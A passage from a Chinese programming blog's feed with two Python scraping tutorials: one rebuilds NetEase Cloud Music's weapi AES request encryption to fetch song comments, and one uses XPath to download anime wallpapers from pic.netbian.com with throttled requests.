<h3 id="代码-python实现解密过程"><a href="#代码-python实现解密过程" class="headerlink" title="代码:python实现解密过程"></a>代码:python实现解密过程</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cursor&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;offset&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;orderType&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pageSize&quot;</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;rid&quot;</span>: <span class="string">&quot;R_SO_4_2061978961&quot;</span>,</span><br><span class="line">        <span class="string">&quot;threadId&quot;</span>: <span class="string">&quot;R_SO_4_2061978961&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#bse6Y(Qu1x.md)</span></span><br><span class="line">f = <span class="string">&quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&quot;</span></span><br><span class="line"></span><br><span class="line">e = <span class="string">&#x27;010001&#x27;</span><span class="comment">#bse6Y([&quot;流泪&quot;, &quot;强&quot;])</span></span><br><span class="line">g = <span class="string">&#x27;0CoJUm6Qyw8W8jud&#x27;</span> <span class="comment">#bse6Y([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;])</span></span><br><span class="line">i = <span class="string">&quot;dTq5gXUy86kvKfID&quot;</span></span><br><span class="line">url = <span class="string">&quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encSecKey</span>():<span class="comment">#我们的i值已经固定，所以这里直接返回固定值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;c56d5b52597656e3d4f0efbe1438679842b2ce4a858d24b66e5b6eb388373415843a38e16f79acddc959d81c4cc734a30ff690cb1e1c9ea611254c9302d1efbe78348f8d5fd3b0e17b3ab37e6c95e81ec87ec434b811c00446c06ca52b4102be7eae1b8c637a81c31f5ce876f16880fb4e5e62cc20adb7b854c707d6bcd9c742&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>首先导入需要的库，<code>requests</code>用于发送请求，<code>json</code>用于处理json数据，<code>AES</code>用于解密，<code>pad</code>用于填充，<code>b64encode</code>用于编码。</p>
<p>详细说一下</p>
<ul>
<li><code>json</code>库，我们需要用到<code>json.dumps()</code>方法将<code>i0x</code>转换成json字符串。因为加密函数 enc_params 需要一个字节序列作为输入。通过先将数据转换为 JSON 字符串，然后编码成字节序列 (.encode(‘utf-8’))，可以满足加密函数的输入要求，也就是说，在加密的时候必须要放入字符串。</li>
<li>引入的<code>pad</code>函数，用于填充，因为加密函数要求输入的长度必须是16的整数倍，所以需要对数据进行填充。</li>
<li><code>b64encode</code>函数，用于编码，因为加密函数的输入要求是字节序列，所以需要将数据编码成字节序列,加密算法要用两次，在<code>js</code>的<code>d</code>函数中有体现。</li>
<li><code>AES</code>库，用于加密。</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_params</span>(<span class="params">data</span>):<span class="comment">#默认收到的是字符串</span></span><br><span class="line">    first =enc_params(data,g)</span><br><span class="line">    second = enc_params(first,i)</span><br><span class="line">    <span class="keyword">return</span> second</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc_params</span>(<span class="params">data, key</span>):</span><br><span class="line">    iv = <span class="string">b&#x27;0102030405060708&#x27;</span>  <span class="comment"># IV 应该是一个字节序列</span></span><br><span class="line">    key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 确保 key 是字节序列</span></span><br><span class="line">    aes = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)  <span class="comment"># 创建加密器对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充数据到16字节边界</span></span><br><span class="line">    padded_data = pad(data.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密填充后的数据</span></span><br><span class="line">    encrypted_data = aes.encrypt(padded_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回加密后的数据的 Base64 编码字符串</span></span><br><span class="line">    <span class="keyword">return</span> b64encode(encrypted_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p><code>iv</code>是初始化向量，这个东西在刚才的js源码中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_js_3/Snipaste_2024-07-29_20-24-27.png"
                     
                ></p>
<p>我们直接粘过来，这玩意是偏移量，具体干什么，大家有兴趣的可以去看看。</p>
<p>有一点我们还需要注意，加密的数据必须是16的整数倍，所以我们需要对数据进行填充。</p>
<p>例如，如果原始数据的长度是 14 字节，块大小是 16 字节，那么需要添加 2 个字节的填充。</p>
<p>因为加密后的数据不能直接<code>decode</code>成字符串，所以我们需要先用<code>b64encode</code>编码成字符串，然后再<code>decode</code>成字节序列。</p>
<p>到这里整个代码就讲解完成了</p>
<hr>
<h1 id="如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！"><a href="#如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！" class="headerlink" title="如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！"></a>如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！</h1><blockquote>
<p>爱发电地址:<a class="link"   href="https://afdian.com/a/AuroraBreeze" >https://afdian.com/a/AuroraBreeze <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫系列:Xpath爬取图片</title>
    <url>/2024/06/20/python%E7%88%AC%E8%99%AB%E7%B3%BB%E5%88%97-Xpath%E7%88%AC%E5%8F%96%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章很久之前就写完了，可是听说这篇文章有许多的问题，但是我在CSDN上并不敢改这篇文章，因为很可能改了就再也发不出来了，所以趁着我搭建了一个博客，把这篇文章重新写一遍，顺便把之前写的烂代码改一下，希望这篇文章能帮到大家。</p>
<p>其次，希望大家学习一下基本的html语法。</p>
<h2 id="python代码"><a href="#python代码" class="headerlink" title="python代码"></a>python代码</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.42&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url_list = []</span><br><span class="line">page = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;./pic/&quot;</span>): </span><br><span class="line">    os.makedirs(<span class="string">&quot;./pic/&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pic_path</span>():</span><br><span class="line">    <span class="keyword">global</span> page,url_list</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        page = <span class="built_in">input</span>(<span class="string">&quot;输入下载页数：&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            page = <span class="built_in">int</span>(page)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;输入页数有误！&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> page == <span class="number">1</span>:</span><br><span class="line">            url = <span class="string">&quot;https://pic.netbian.com/4kdongman/index.html&quot;</span></span><br><span class="line">            <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> page &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, page + <span class="number">1</span>):</span><br><span class="line">                url_list.append(<span class="string">&quot;https://pic.netbian.com/4kdongman/index.html&quot;</span>)</span><br><span class="line">                url_list.append(<span class="string">&quot;https://pic.netbian.com/4kdongman/index_&#123;&#125;.html&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;输入页数有误！&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> url <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        response = requests.get(url, headers=headers).text.encode(<span class="string">&#x27;iso-8859-1&#x27;</span>)</span><br><span class="line">        Batch_processing(response)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">            response = requests.get(url, headers=headers).text.encode(<span class="string">&#x27;iso-8859-1&#x27;</span>)</span><br><span class="line">            Batch_processing(response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Batch_processing</span>(<span class="params">response</span>):</span><br><span class="line">    tree = etree.HTML(response)</span><br><span class="line">    pic_list = tree.xpath(<span class="string">&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pic_list_item <span class="keyword">in</span> pic_list:</span><br><span class="line">        <span class="comment"># print(pic_list_item.xpath(&#x27;a/img/@src&#x27;)[0])</span></span><br><span class="line">        <span class="comment"># print(pic_list_item.xpath(&#x27;a/b/text()&#x27;)[0])</span></span><br><span class="line">        html_url = <span class="string">&quot;https://pic.netbian.com&quot;</span> + pic_list_item.xpath(<span class="string">&#x27;a/img/@src&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        name_pat = pic_list_item.xpath(<span class="string">&#x27;a/b/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(html_url)</span><br><span class="line">        <span class="built_in">print</span>(name_pat)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            name = <span class="built_in">str</span>(name_pat.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>) + <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">            name = <span class="built_in">str</span>(name.replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;&quot;</span>))  <span class="comment"># 处理文件名中含有*的情况，有些文件名中含有*会导致文件无法保存</span></span><br><span class="line">            pic_get = requests.get(html_url, headers=headers).content</span><br><span class="line"></span><br><span class="line">            pic_save_path = <span class="string">&quot;./pic/&quot;</span> + name</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(pic_save_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(pic_get)</span><br><span class="line">                <span class="built_in">print</span>(name + <span class="string">&quot;下载完成！&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            <span class="built_in">print</span>(name + <span class="string">&quot;下载失败！&quot;</span>)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(response)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pic_path = tree.xpath(&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li[1]/a/img&#x27;)</span></span><br><span class="line"><span class="string">pic_name = tree.xpath(&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li[1]/a/b&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(pic_path[0].get(&#x27;src&#x27;))</span></span><br><span class="line"><span class="string">print(pic_name[0].text)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = pic_path()</span><br><span class="line">    download(url)</span><br></pre></td></tr></table></figure></div>




<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><hr>
<p>首先，我们需要安装<code>lxml</code>库，这是Python的一个第三方库，可以用来解析和操作XML和HTML文档，也是我们使用Xpath爬取网页图片所必须的Python库。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pip install lxml</span><br></pre></td></tr></table></figure></div>

<hr>
<p>其次是安装<code>requests</code>库，这是Python的一个第三方库，可以用来发送HTTP请求，我们使用它来获取网页内容，基本上大部分爬虫都需要这个库。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure></div>

<hr>
<p>最后，我们也会用到Python的<code>os</code>模块，用来处理图片的下载，以及<code>time</code>模块，<strong>来减缓我们的请求频率，毕竟我们只是练习，我们并不希望用这个爬虫给别人网站造成压力</strong>。</p>
<hr>
<h3 id="代码解析之一"><a href="#代码解析之一" class="headerlink" title="代码解析之一"></a>代码解析之一</h3><p><strong>思路分析</strong></p>
<p>这次我们的目标是在这个网站进行图片的爬取下载,网站的网址为</p>
<p><a class="link"   href="https://pic.netbian.com/4kdongman/index.html" >https://pic.netbian.com/4kdongman/index.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>我们需要分析这个网站的结构，拿到我们所需要的信息，从而进行下载图片。</p>
<p>我们首先去分析目标网站，我们这次挑选的网站结构比较简单。</p>
<blockquote>
<p>按 <strong>F12</strong> 进入开发者工具</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vW4F6.png"
                      title="按F12后的界面"
                ></p>
<p>通过图片上的步骤我们进入到网站html界面放置图片的位置。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vWbzq.png"
                      title="点击图片后的界面"
                ></p>
<p><strong>接下来我们去找图片到底在哪里，我们这里只找到了相对位置</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vWYkr.png"
                      title="在这里找图片地址"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vWju5.png"
                     
                ></p>
<blockquote>
<p><strong>记得刷新，不刷新找不到这些图片</strong></p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vWxGB.png"
                     
                ></p>
<p>我们从这找到了图片的位置，到底是不是这张图片，我门去这个url里看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vXvdG.png"
                     
                ></p>
<p>我们可以看到，我们找到的url是正确的，所以我们想要下载图片，就必须拿到图片的url。</p>
<blockquote>
<p>接下来我们分析我们拿到的相对位置与图片的位置有什么区别？</p>
</blockquote>
<p>我们先来看我们拿到的相对位置</p>
<p><strong>&#x2F;uploads&#x2F;allimg&#x2F;240618&#x2F;202141-1718713301deda.jpg</strong></p>
<p>我们再来看我们找到的图片的位置</p>
<p><strong><a class="link"   href="https://pic.netbian.com/uploads/allimg/240618/202141-1718713301deda.jpg" >https://pic.netbian.com/uploads/allimg/240618/202141-1718713301deda.jpg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
<blockquote>
<p>这两个地址之间就差了一个<code>https://pic.netbian.com</code><strong>所以如果我们拿到了相对位置，只需要在相对位置上加上<code>https://pic.netbian.com</code>就能找到图片的url。</strong></p>
</blockquote>
<hr>
<h3 id="代码解析之二"><a href="#代码解析之二" class="headerlink" title="代码解析之二"></a>代码解析之二</h3><p><strong>我们现在先编写代码把相对位置的图片url转换成绝对位置的图片url</strong></p>
<p>这里的代码与最后的代码不同，我们以后会改。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.42&#x27;</span></span><br><span class="line">&#125;<span class="comment">#UA伪装，防止服务器拒绝访问</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://pic.netbian.com/4kdongman/index.html&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url, headers=headers).text.encode(<span class="string">&#x27;iso-8859-1&#x27;</span>)<span class="comment">#获取网页内容，同时将网页内容编码为iso-8859-1，也就是解析为中文，要不然全是乱码，根本不是给人看到</span></span><br><span class="line"></span><br><span class="line">tree = etree.HTML(response)<span class="comment">#解析网页内容,用这个来加载xpath</span></span><br><span class="line"></span><br><span class="line">pic_path = tree.xpath(<span class="string">&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li[1]/a/img/@src&#x27;</span>)[<span class="number">0</span>]<span class="comment">#获取相对位置的图片url</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pic_path)<span class="comment">#打印相对位置的图片url</span></span><br></pre></td></tr></table></figure></div>

<p>这里我们先看一下找到的是不是相对位置，下面图片是输出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vXB4H.png"
                      title="输出"
                ></p>
<p>确实是我们想要的输出。</p>
<p>对于xpath怎么获取图片的url，在浏览器我们可以直接右键获取xpath地址，如有需要还是建议大家去看看xpath的语法。</p>
<p>以后我们再细讲一下，我们先来分析我们的代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vXkC7.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vX0Fw.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vXqzo.png"
                     
                ></p>
<p>两个中随便挑一个就行，我们这里用的是<code>//*[@id=&quot;main&quot;]/div[3]/ul/li[1]/a/img</code>这样为了我们能够拿到html中的图片url，我们需要用到<code>@src</code>属性，这个属性可以帮助我们拿到图片的url，当然返回的是一个列表，我们再用<code>[0]</code>来获取第一个url，就可以拿到图片的url了。<br><code>//*[@id=&quot;main&quot;]/div[3]/ul/li[1]/a/img/@src</code></p>
<p>这样我们就拿到了第一个图片的位置，但是我们需要拿到所以的图片的url，那我们要怎么办呢？</p>
<p>聪明的同志已经知道了，那就写个循环呗，把所有的url都拿到。</p>
<blockquote>
<p>但提醒一点的是，我们是进入到了<code>&lt;li&gt;</code>标签中拿到的图片的URL，我们再分析一下图片的位置，我们会发现，所有的图片都包裹在<code>&lt;li&gt;</code>中，所以我们只需要循环遍历所有的<code>&lt;li&gt;</code>标签，然后再用xpath来获取图片的url就行了。</p>
</blockquote>
<p>所以事不宜迟，我们改代码把所有图片的url都拿到。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">tree = etree.HTML(response)<span class="comment">#解析网页内容,用这个来加载xpath</span></span><br><span class="line"></span><br><span class="line">pic_path = tree.xpath(<span class="string">&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li&#x27;</span>)<span class="comment">#获取相对位置的图片url</span></span><br><span class="line"><span class="keyword">for</span> pic <span class="keyword">in</span> pic_path:</span><br><span class="line">    html_url = <span class="string">&quot;https://pic.netbian.com&quot;</span> + pic.xpath(<span class="string">&#x27;a/img/@src&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(html_url)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<hr>
<blockquote>
<p><code>tree = etree.HTML(response)#解析网页内容,用这个来加载xpath</code><br><strong>这个代码及以上都没有改动，只有他的下面进行了改动，以后我们也是这样提示我们所改动的地方!!!!!!。</strong></p>
</blockquote>
<hr>
<p>下面是输出,这样我们就拿到了所有图片的url了，当然只是这一页，下面的页数我们稍后再讲。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vXR0I.png"
                     
                ></p>
<p>我们再来获取他的名字，这个我们就不解释了，希望大家自己尝试一下，我们直接给出代码。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pic_path = tree.xpath(<span class="string">&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li&#x27;</span>)<span class="comment">#获取相对位置的图片url</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pic <span class="keyword">in</span> pic_path:</span><br><span class="line">    html_url = <span class="string">&quot;https://pic.netbian.com&quot;</span> + pic.xpath(<span class="string">&#x27;a/img/@src&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    name_url = pic.xpath(<span class="string">&#x27;a/b/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(html_url)</span><br><span class="line">    <span class="built_in">print</span>(name_url)</span><br></pre></td></tr></table></figure></div>
<p>下面是输出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vXaui.png"
                     
                ></p>
<h3 id="代码解析之三"><a href="#代码解析之三" class="headerlink" title="代码解析之三"></a>代码解析之三</h3><p><strong>我们现在开始编写代码来下载图片</strong></p>
<p>既然名字和地址我们都拿到了，剩下的就是怎么把图片给下载下来了。</p>
<blockquote>
<p>这里有一点要注意，图片保存的时候名字有限制，比如我们下载的第一个图片的名字中有<strong>星号</strong>，这就不行，所以我们需要对名字进行处理，比如把空格替换成下划线，把*替换成其他字符等。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> pic <span class="keyword">in</span> pic_path:</span><br><span class="line">    html_url = <span class="string">&quot;https://pic.netbian.com&quot;</span> + pic.xpath(<span class="string">&#x27;a/img/@src&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    name_url = pic.xpath(<span class="string">&#x27;a/b/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(html_url)</span><br><span class="line">    <span class="built_in">print</span>(name_url)</span><br><span class="line">    name = <span class="built_in">str</span>(name_url.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;_&quot;</span>) + <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">    name = <span class="built_in">str</span>(name.replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;&quot;</span>))  <span class="comment"># 处理文件名中含有*的情况，有些文件名中含有*会导致文件无法保存</span></span><br><span class="line">    </span><br><span class="line">    pic_get = requests.get(html_url, headers=headers).content<span class="comment">#获取图片内容</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    pic_save_path = <span class="string">&quot;./pic/&quot;</span> + name <span class="comment"># 图片保存路径</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;./pic/&quot;</span>):<span class="comment">#判断图片保存路径是否存在，不存在则创建</span></span><br><span class="line">        os.makedirs(<span class="string">&quot;./pic/&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(pic_save_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pic_get)</span><br><span class="line">        <span class="built_in">print</span>(name + <span class="string">&quot;下载完成！&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        time.sleep(<span class="number">0.3</span>) <span class="comment"># 防止被服务器封IP</span></span><br></pre></td></tr></table></figure></div>
<p>下面是输出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vXIvR.png"
                     
                ></p>
<p>首先，我们获取的名字需要处理，我们需要把名字中的空格和星号都处理掉，这样才能保存为一个文件名，同时我们要加入<code>.jpg</code>后缀，才能保存图片，我们就用<code>replace()</code>函数来替换空格和星号，然后加上<code>.jpg</code>后缀，<code>replace</code>函数的第一个参数是被替换的字符，第二个参数是替换成什么字符。</p>
<p>然后，我们获取图片的url，然后用<code>requests</code>库来获取图片的内容，<code>requests.get(url, headers=headers).content</code>,这里的<code>content</code>是<strong>持续化存储</strong>，我们要用这种方式存储图片。</p>
<p>我们再用<code>os</code>库来判断图片保存路径是否存在，不存在则创建，然后用<code>with open(pic_save_path, &#39;wb&#39;) as f:</code>来写入图片内容，最后打印下载完成。</p>
<blockquote>
<p>对于<code>with open(pic_save_path, &#39;wb&#39;) as f:</code>这句代码，我们用<code>wb</code>模式打开文件，<code>wb</code>模式是写入二进制文件，<code>with open(pic_save_path, &#39;wb&#39;) as f:</code>的意思是打开一个文件，文件名为<code>pic_save_path</code>，以二进制写入模式打开，然后用<code>f.write(pic_get)</code>来写入图片内容，<code>pic_get</code>是获取到的图片内容。</p>
</blockquote>
<p>最后，我们用<code>time.sleep(0.3)</code>来防止被服务器封IP，毕竟我们只是练习，我们并不希望用这个爬虫给别人网站造成压力。</p>
<h3 id="代码解析之四"><a href="#代码解析之四" class="headerlink" title="代码解析之四"></a>代码解析之四</h3><p><strong>我们再来下载其他页面的图片</strong></p>
<p>说实话到这里基本上已经完成一半多了，我们再坚持一下，就成功了。</p>
<p>我们先来分析一下其他页面的图片的位置。</p>
<p><strong>第一页</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vXNDz.png"
                     
                ></p>
<p><strong>第二页</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vXPAe.png"
                     
                ></p>
<p><strong>第三页</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vXlbk.png"
                     
                ></p>
<blockquote>
<p>我们可以看到，第一页为<code>index.html</code>，第二页为<code>index_2.html</code>，第三页为<code>index_3.html</code>。</p>
</blockquote>
<p>大家可以自己分析一下第二，三页图片的位置，是和第一页一样的，我们不再赘述。</p>
<p>这样我们就得开动一下脑筋，第一页和其他页的url有差别，但是第二三四及以后的页面的url是有规律的，我们可以用循环来实现，但是第一页呢？</p>
<p>当然我们可以直接用笨办法，写两个循环，但感觉太臃肿了，不太好。</p>
<h3 id="代码解析之五"><a href="#代码解析之五" class="headerlink" title="代码解析之五"></a>代码解析之五</h3><p><strong>实现思路及优化</strong></p>
<blockquote>
<p>思路导图</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_xpath_1/vXOJQ.png"
                     
                ></p>
